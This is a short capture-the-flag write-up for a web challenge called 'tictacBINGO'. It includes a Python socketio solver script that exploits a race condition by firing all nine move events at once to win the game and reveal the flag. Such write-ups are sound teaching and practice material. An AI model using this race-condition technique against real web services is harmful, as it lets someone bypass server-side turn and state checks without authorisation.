## tictacBINGO [500]
In this challenge, we encounter what seems to be a tic-tac-toe game. However, no matter what we do, we cannot win or lose, even if the bot successfully completes a line.

After some exploration, it turns out that we need to fill all sections with `X` to win. We can exploit a *Race Condition* to fill all sections with the flag and get the flag.

### Solver Code
```python
import socketio
import time

sio = socketio.Client()

SERVER_URL = "https://usc-tictacbingo.chals.io"  # Replace with the actual server URL

game_id = None  # Replace with the actual game_id

@sio.event
def connect():
    print("Connected to server")
    # Send event to start a new game
    sio.emit('client_new_game')

@sio.on('server_new_game')
def on_new_game(data):
    global game_id
    print(f'Data from server_new_game: {data}')
    game_id = data['game_id']
    print(f"New game started with ID: {game_id}")
    print("Waiting for your turn to start...")
    send_forced_win()

def send_forced_win():
    winning_squares = [6, 7, 8, 0, 1, 2, 3, 5, 4]
    
    for square in winning_squares:
        sio.emit('client_place_square', {
            'game_id': game_id,
            'square': square
        })
        print(f"Sent move for square {square}")
        time.sleep(0)  # Short delay to avoid sending too quickly

    print("Forced winning moves sent to the server.")

@sio.on('server_board_update')
def on_board_update(data):
    # Display board status
    board = ["X" if x == 0 else "O" if x == 1 else " " for x in data['board']]
    for i in range(0, 9, 3):
        print(f"{board[i]} | {board[i+1]} | {board[i+2]}")
    
    if data['winner'] == 0:
        print(f"Flag: {data['flag']}")
        print("You won! You might have obtained the flag.")
    elif data['winner'] == 1:
        print("You lost...")
    elif data['winner'] == 3:
        print("It's a draw.")
    elif data['turn'] == 0:  # Player's turn
        print("Your turn")

@sio.event
def disconnect():
    print("Disconnected from server")

@sio.event
def connect_error():
    print("Connection failed!")

sio.connect(SERVER_URL, wait_timeout=10)

sio.wait()
```
```
CYBORG{th15_is_w3bs0cke7s_no7_osu!}
```